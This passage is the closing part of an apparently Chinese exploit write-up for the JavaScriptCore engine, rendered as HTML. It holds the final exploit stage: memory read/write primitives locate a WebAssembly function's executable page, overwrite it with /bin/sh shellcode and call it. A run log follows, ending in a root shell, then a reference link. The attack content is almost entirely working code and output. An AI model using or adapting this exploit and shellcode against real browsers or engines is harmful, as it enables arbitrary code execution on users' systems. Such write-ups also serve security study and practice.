&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var wasm_instance = new WebAssembly.Instance(wasm_mod);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var f = wasm_instance.exports.main;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var addr_f = this.addrof(f);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var addr_p = this.read64(addr_f + 0x40);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var addr_shellcode = this.read64(addr_p);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(addr_f.toString(16))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(addr_p.toString(16))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(addr_shellcode.toString(16));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode = &quot;j;X\x99RH\xbb//bin/shST_RWT^\x0f\x05&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.write(addr_shellcode, shellcode);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">stage2.pwn()</span></p><h4 class="cs868C439D">
			<a name="运行效果"><span class="cs6EDCDAE2">运行效果</span></a></h4>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">运行效果如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">╰$ ./jsc exp.js</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">hit: 2e5e</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffae2af690 with butterfly 0x7fe00028c078 (Structure 0x7fffaf6f2a70:[Array, {}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 98</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffae2af6a0 with butterfly 0x7fe00028c0e8 (Structure 0x7fffaf6f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x7fffaf6c80a0]), StructureID: 99</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffae2591f0 with butterfly 0x7fe000280058 (Structure 0x7fffaf670d20:[Array, {prop:100, prop1:101}, ArrayWithDouble, Proto:0x7fffaf6c80a0, Leaf]), StructureID: 317</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7fffae2591f0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Object: 0x7fffaf6c8380 with butterfly (nil) (Structure 0x7fffaf670e00:[Object, {jscell:0, butterfly:1}, NonArray, Proto:0x7fffaf6b4000, Leaf]), StructureID: 319</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7fffae208000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7ffff000a500</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">7fffb0001000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># id</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">uid=0(root) gid=0(root) groups=0(root)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span></p><p class="cs40DD2BC9"><span class="cs8926E06">##</span><span class="cs9C1B1871">参考链接</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7694#toc-2</span></p></body>
</html>
